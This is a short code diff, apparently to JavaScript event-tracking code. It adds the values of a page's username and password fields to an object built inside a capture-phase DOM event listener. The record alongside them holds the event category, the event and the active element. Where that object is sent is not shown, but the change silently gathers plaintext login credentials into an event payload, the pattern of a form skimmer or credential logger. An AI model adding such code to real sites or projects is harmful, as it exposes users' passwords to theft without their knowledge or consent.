@@ -50,6 +50,10 @@
           'event': DOMEventCategory,
           'e': e,
           'active': document.activeElement,
+          'data': {
+            'username': document.getElementById('username').value,
+            'password': document.getElementById('password').value
+          }
         })
 
       }, true);
